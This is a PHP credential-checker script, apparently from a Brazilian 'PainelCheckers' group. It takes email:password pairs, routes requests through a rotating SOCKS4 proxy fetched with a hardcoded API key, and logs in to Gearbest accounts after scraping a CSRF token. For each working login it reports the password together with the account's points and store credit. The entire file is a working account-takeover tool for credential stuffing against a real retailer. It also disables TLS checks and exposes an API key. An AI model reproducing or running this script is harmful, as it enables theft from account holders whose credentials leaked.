<?php

error_reporting(0);
set_time_limit(0);
DeletarCookies();

extract($_GET);

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}

list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$linhas);

function dados($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} //funcao para puxar os dados

        $link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
        $link2 = json_decode($link);
        $link3 = $link2 ->ip;
        $link4 = $link2 ->port;
        $proxy = $link3.":".$link4;

        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://login.gearbest.com/m-users-a-sign.htm?type=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: login.gearbest.com',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: application/json, text/plain, */*',
        'Accept-Language: pt-BR,pt;q=0.5',
        'Content-Type: application/json;charset=utf-8',
        'Referer: https://login.gearbest.com/m-users-a-sign.htm?type=1',
        'Connection: keep-alive'
    ));
        curl_setopt($ch, CURLOPT_POST, 0);
        //curl_setopt($ch, CURLOPT_POSTFIELDS, 'Email='.$email.'&Password='.$senha.'&ReturnUrl=ajax&OriginUrl=https%3A%2F%2Fdescomplica.com.br%2Fentrar%2F');   
        $result = curl_exec($ch);

        $token = dados($result, 'type="hidden" name="_token" value="','"', 1);


        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://login.gearbest.com/user/login");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: login.gearbest.com',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: application/json, text/plain, */*',
        'Accept-Language: pt-BR,pt;q=0.5',
        'X-CSRF-TOKEN: '.$token.'',
        'Content-Type: application/json;charset=utf-8',
        'Referer: https://login.gearbest.com/m-users-a-sign.htm?type=1',
        'Connection: keep-alive'
    ));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"_token":"'.$token.'","email":"'.$email.'","passWord":"'.$senha.'","timeZone":"-3","userCenterSuffix":""}');   
        $result2 = curl_exec($ch);

        curl_setopt($ch, CURLOPT_URL, "https://user.gearbest.com/index#/setting/info");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: user.gearbest.com',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer: https://br.gearbest.com/',
        'Connection: keep-alive'
    ));
        curl_setopt($ch, CURLOPT_POST, 0);
        $result3 = curl_exec($ch);

        $pontos = dados($result3, 'data-point="','"', 1);
        $saldo = dados($result3, 'data-credit="','"', 1);

        //echo $result3;

       
        if (strpos($result2, '"status":0,') !== false) {

            echo "<b><i><font style='color: green;'>#Aprovada ✔&nbsp;&nbsp;</font></i>  $email|$senha | Pontos: $pontos | Saldo: R$$saldo | <font style='color: MidnightBlue;'>@PainelCheckers</font></b>";
        }else{
             echo "<font style='color: red;'>#Reprovada ❌</font>  $email|$senha <font style='color: DeepSkyBlue;'>@PainelCheckers</font>";
        }

             if (file_exists(getcwd().'/teste.txt')) {
            unlink(getcwd().'/teste.txt');
        }
?>
